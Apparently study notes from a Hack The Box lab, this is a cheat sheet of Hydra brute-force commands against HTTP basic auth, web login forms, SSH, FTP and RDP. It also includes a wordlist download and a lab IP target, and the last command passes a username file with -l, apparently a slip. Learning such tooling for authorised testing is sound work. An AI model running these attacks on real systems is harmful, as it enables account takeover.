
## Brute Forcing HTTP Authentication
```python
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
## Targeting Multiple SSH servers

```python
hydra -l root -p toor -M targets.txt ssh
```

### Testing FTP Credentials on a Non-Standard Port
```python
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

### Brute-Forcing a Web Login Form
```python
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
### Advanced RDP Brute-Forcing
- You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers.
```python
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
## Exploiting Basic Auth with Hydra
```python
# Download wordlist if needed  HrithikManoj000@htb[/htb]$ 
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt 
# Hydra command HrithikManoj000@htb[/htb]$ 
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

## Exploiting login forms (POST)
```python
hydra -l top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.73
-s 32379 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```